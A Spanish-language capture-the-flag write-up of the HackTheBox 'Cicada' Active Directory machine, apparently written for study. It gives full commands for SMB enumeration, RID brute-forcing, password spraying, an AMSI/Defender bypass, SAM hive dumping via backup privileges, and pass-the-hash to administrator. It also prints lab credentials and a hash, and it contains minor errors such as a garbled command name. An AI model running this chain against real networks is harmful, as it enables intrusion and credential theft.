---
title: Cicada
layout: default
parent: HackTheBox
---

# Cicada
{:.no_toc}

---

1. List
{:toc}

---

Realizada gracias a la guía de [Baran](https://medium.com/@spAce0x/htb-cicada-write-up-4cc5560660bf).

---
## Reconocimiento

Primero comprobamos que tenemos conexión con la máquina, con un simple paquete ICMP con el comando ping.

```bash
ping -c 1 10.10.11.35
```

![](/assets/images/Imagenes/Pasted image 20241010230037.png)

Vemos que es así, por lo que ahora veremos que puertos tiene abiertos. Indicaremos que solo queremos mostrar los puertos abiertos, con un escaneo silencioso, con un rate no menor a 5000 paquetes por segundo, sin resolución DNS y exportando el resultado al archivo allPorts

```bash
nmap -p- -sS --open --min-rate 5000 10.10.11.35 -n -Pn -oG allPorts
```

Vemos que tiene bastantes puertos abiertos:

![](/assets/images/Imagenes/Pasted image 20241010230650.png)

Después de esto comprobaremos la versión de estos puertos:

```bash
nmap -sCV -p53,88,135,139,389,445,464,593,3268,3269,5985,62343 10.10.11.35  -oN targeted
```

```javascript
 # Nmap 7.94SVN scan initiated Thu Oct 10 23:14:49 2024 as: /usr/lib/nmap/nmap -sCV -p53,88,135
       │ ,139,389,445,464,593,3268,3269,5985,62343 -oN targeted 10.10.11.35                            
   2   │ Nmap scan report for 10.10.11.35 (10.10.11.35)                                                
   3   │ Host is up (0.032s latency).                                                                  
   4   │                                                                                               
   5   │ PORT      STATE SERVICE       VERSION                                                         
   6   │ 53/tcp    open  domain        Simple DNS Plus                                                 
   7   │ 88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-11 04:14:58Z)  
   8   │ 135/tcp   open  msrpc         Microsoft Windows RPC                                           
   9   │ 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                   
  10   │ 389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., S
       │ ite: Default-First-Site-Name)                                                                 
  11   │ | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb                                          
  12   │ | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cica
       │ da.htb                                                                                        
  13   │ | Not valid before: 2024-08-22T20:24:16                                                       
  14   │ |_Not valid after:  2025-08-22T20:24:16                                                       
  15   │ |_ssl-date: TLS randomness does not represent time                                            
  16   │ 445/tcp   open  microsoft-ds?                                                                 
  17   │ 464/tcp   open  kpasswd5?                                                                     
  18   │ 593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                             
  19   │ 3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., S
       │ ite: Default-First-Site-Name)                                                                 
  20   │ |_ssl-date: TLS randomness does not represent time                                            
  21   │ | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
  22   │ | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cica
       │ da.htb
  23   │ | Not valid before: 2024-08-22T20:24:16
  24   │ |_Not valid after:  2025-08-22T20:24:16
  25   │ 3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., S
       │ ite: Default-First-Site-Name)
  26   │ |_ssl-date: TLS randomness does not represent time
  27   │ | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
  28   │ | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cica
       │ da.htb
  29   │ | Not valid before: 2024-08-22T20:24:16
  30   │ |_Not valid after:  2025-08-22T20:24:16
  31   │ 5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
  32   │ |_http-server-header: Microsoft-HTTPAPI/2.0
  33   │ |_http-title: Not Found
  34   │ 62343/tcp open  msrpc         Microsoft Windows RPC
  35   │ Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
  36   │ 
  37   │ Host script results:
  38   │ | smb2-security-mode: 
  39   │ |   3:1:1: 
  40   │ |_    Message signing enabled and required

```

Lo más interesante es el puerto 135 (SMB). Podemos ver el contenido compartido del servicio:

![](/assets/images/Imagenes/Pasted image 20241010231059.png)

Si intentamos entrar a la carpeta de DEV vemos que no tenemos permisos:

```bash
smbclient \\\\10.10.11.35\\DEV
```

![](/assets/images/Imagenes/Pasted image 20241010232031.png)

Sin embargo si intentamos entrar a HR vemos que hay un archivo.

```bash
smbclient \\\\10.10.11.35\\HR
```

![](/assets/images/Imagenes/Pasted image 20241010232120 1.png)

Podemos descargarlo con **get**.

```bash
get "Notice from HR.txt"
```

![](/assets/images/Imagenes/Pasted image 20241010232417.png)

Si vemos su contenido veremos que existe una contraseña: **Cicada$M6Corpb*@Lp#nZp!8**.
Al parecer es para acceder a una cuenta corporativa de cicada.

![](/assets/images/Imagenes/Pasted image 20241010232645.png)

Con esto ya tenemos una contraseña, ahora nos falta tener un usuario. Para ello podemos usar la herramienta **crackmapexec**.

```bash
crackmapexec smb 10.10.11.35 -u Guest -p '' --rid-brute | tee user_list.txt
```

Después filtramos para ver los usuarios:

```bash
cat user_list.txt | grep SidTypeUser | cut -d '\' -f 2 | awk '{print $1}' > users.txt
```

![](/assets/images/Imagenes/Pasted image 20241010233623.png)

---

## Explotación

Con esta lista de usuarios de smb podemos probar para ver si coincide alguno con la contraseña que conseguimos anteriormente. Podemos hacerlo con netxec, herramienta para automatizar tareas en la red.

```bash
nxc smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'  --continue-on-success
```

![](/assets/images/Imagenes/Pasted image 20241011194936.png)

Vemos que las credenciales son válidas con el usuario *michael.wrightson*. Gracias a esto es posible enumerar los usuarios y contraseñas que existan en el sistema.

```bash
nxc smb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' -M get-desc-users
```

Con el siguiente comando, gracias a las credenciales que hemos obtenido, listamos la descripción de los usuarios de ldap. Y encontramos una interesante:

![](/assets/images/Imagenes/Pasted image 20241011195437.png)

Conseguimos la contraseña de *david.orelious*, `aRt$Lp#7t*VQ!3`.

Si probamos a listar las carpetas compartidas a las que tiene acceso david vemos que DEV está entre ellas:

```bash
nxc smb 10.10.11.35 -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
```

![](/assets/images/Imagenes/Pasted image 20241011195914.png)

Podemos acceder con smbclient como anteriormente con las credenciales de david.

```bash
smbclient \\\\10.10.11.35\\DEV -U david.orelious@cicada.htb
```

![](/assets/images/Imagenes/Pasted image 20241011200451.png)

Vemos que dentro tiene un archivo de backup, que puede que contenga credenciales para el sistema. Podemos descargarlo como antes con *get*.

Si miramos su contenido vemos que efectivamente existen las credenciales de emily.oscars, con la contraseña `Q!3@Lp#M6b*7t*Vt`.

![](/assets/images/Imagenes/Pasted image 20241011200748.png)

Con este usuario y su credencial ya podemos entrar al share de C$.

```bash
smbclient \\\\10.10.11.35\\C$ -U emily.oscars@cicada.htb
```

![](/assets/images/Imagenes/Pasted image 20241011201015.png)

Veremos que en su escritorio estará la primera bandera de usuario.

![](/assets/images/Imagenes/Pasted image 20241011201233.png)

---

## Escalada de privilegios

Vemos también que está la bandera de root, pero no tenemos permisos suficientes para ver el archivo. Para tener una consola de forma más cómoda del sistema podemos usar la herramienta evilwin-rm.

```bash
evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

![](/assets/images/Imagenes/Pasted image 20241011201847.png)

Una vez dentro para ver los permisos que tenemos debemos hacer bypass a windows defender con *Bypass-4MSI*. Una vez terminado la implementación ejecutamos el comando:

```bash
whoami /priv
```

![](/assets/images/Imagenes/Pasted image 20241011202119.png)

Vemos que emily tiene permisos para realizar una copia de seguridad, con lo que podríamos copiar el ficheros y carpetas del sistema donde se guarden datos para escalar, como SAM en nuestra máquina.

Para ello podemos dirigirnos al directorio C:\, donde crearemos el directorio *Temp* y ahí realizaremos las copias:

![](/assets/images/Imagenes/Pasted image 20241011203122.png)

```bash
reg save hklm\sam C:\temp\sam

reg save hklm\system C:\temp\system
```

![](/assets/images/Imagenes/Pasted image 20241011203850.png)

Una vez descargado debemos pasar primero los dos archivos para juntar cada usuario con su respectiva contraseña, como passwd y shadow enlinux. Para ello podemos usar **secretsdump**:

```bash
simpacket-ecretsdump -sam sam -system system local
```

![](/assets/images/Imagenes/Pasted image 20241011210115.png)

Con este hash de administrador (la última parte) podemos intentar realizar un ataque *pass the hass*, introduciendo el hash de la contraseña del administrador.

```bash
evil-winrm -i cicada.htb -u administrator -H '2b87e7c93a3e8a0ea4a581937016f341'
```

![](/assets/images/Imagenes/Pasted image 20241011210745.png)

Con esto ya tendremos root a la máquina, estando la bandera de este en su desktop.

![](/assets/images/Imagenes/Pasted image 20241011210919.png)